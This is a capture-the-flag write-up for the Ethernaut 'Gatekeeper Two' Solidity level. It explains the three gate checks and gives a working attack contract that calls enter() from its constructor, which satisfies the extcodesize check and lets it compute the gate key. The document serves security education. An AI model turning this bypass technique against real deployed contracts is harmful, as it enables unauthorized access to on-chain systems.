# Level 14: Gatekeeper Two

## Challenge Overview

This challenge builds on the concepts of access control and precise gas requirements.  
The goal is to bypass three conditions and call the `enter` function of the `GatekeeperTwo` contract.

## Goal

Solve the three gate conditions in the `GatekeeperTwo` contract to successfully call the `enter` function.

## Solution

The `GatekeeperTwo` contract enforces three checks—each must be satisfied in order to become the new entrant.



## Gate Conditions

### 1. Gate One

```solidity
require(msg.sender != tx.origin);
```

`enter()` must be called by a contract, not directly by your EOA.

### 2. Gate Two

```solidity
assembly { size := extcodesize(caller()) }
require(size == 0);
```

At the moment of the call, the caller’s code size must be zero.  
**Trick:** Calls made inside a constructor see `extcodesize(this) == 0`.

### 3. Gate Three

```solidity
require(
  uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) 
  ^ uint64(_gateKey) 
  == type(uint64).max
);
```

Let `H = bytes8(keccak256(abi.encodePacked(msg.sender)))`  
Then `_gateKey` must equal the **bitwise complement** of `H`, i.e.:

```solidity
_gateKey = H ^ 0xFFFFFFFFFFFFFFFF
```

---

## Attack the Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address _target) public {
        // 1) Compute H = first 8 bytes of keccak(this)
        bytes8 H = bytes8(keccak256(abi.encodePacked(address(this))));

        // 2) Compute key = bitwise NOT of H
        bytes8 key = H ^ bytes8(type(uint64).max);

        // 3) Invoke enter() in the constructor:
        //    - msg.sender != tx.origin      [Gate One]
        //    - extcodesize(this) == 0       [Gate Two]
        //    - H ^ key == all 1’s           [Gate Three]
        IGatekeeperTwo(_target).enter(key);
    }
}
```



## Deployment & Verification

1. **Compile** `GatekeeperTwoAttack.sol` with Solidity `^0.6.0`.

2. In **Remix → Deploy & Run Transactions**:
   - **Environment** → Injected Web3 (MetaMask on same network as Ethernaut).
   - **Value** → leave at `0`.
   - **Contract** → select `GatekeeperTwoAttack`.
   - **Constructor Argument** → paste your `GatekeeperTwo` instance’s address (`contract.address` from Ethernaut).

3. **Click Deploy** and confirm the MetaMask transaction.

4. Back in the **Ethernaut** console, run:

```javascript
(await contract.entrant()) === player  // should be true
```

5. **Click Submit** on the level page to clear Gatekeeper Two.



## Lessons Learned

- Invoking your exploit during deployment (while your contract’s code isn’t on-chain yet) lets you satisfy the `extcodesize == 0` requirement that would block you afterward. Use the constructor to bypass code-size checks.
- If a key is just the inverse or derivative of `keccak256(msg.sender)`, anyone who knows your contract’s address can recompute it. Don’t trust hash-based gates as secrets.
- Before you attack, walk through each modifier in order, duplicate its logic in your exploit so you pass every gate.
